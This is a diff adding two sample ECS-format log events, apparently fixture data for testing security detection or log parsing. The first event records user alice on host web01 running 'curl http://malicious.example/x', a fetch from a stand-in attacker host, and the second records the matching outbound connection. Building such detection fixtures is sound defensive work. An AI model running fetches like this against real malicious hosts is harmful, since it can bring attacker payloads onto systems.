@@ -1,0 +1,2 @@
+{"@timestamp":"2026-03-01T10:00:00Z","ecs":{"version":"8.11.0"},"host":{"name":"web01"},"event":{"category":["process"],"action":"start","outcome":"success"},"process":{"executable":"/usr/bin/curl","command_line":"curl http://malicious.example/x"},"user":{"name":"alice"},"source":{"ip":"192.0.2.10","port":44322}}
+{"@timestamp":"2026-03-01T10:00:05Z","ecs":{"version":"8.11.0"},"host":{"name":"web01"},"event":{"category":["network"],"outcome":"success"},"source":{"ip":"192.0.2.10","port":44322},"destination":{"ip":"198.51.100.9","port":80},"message":"connection"}
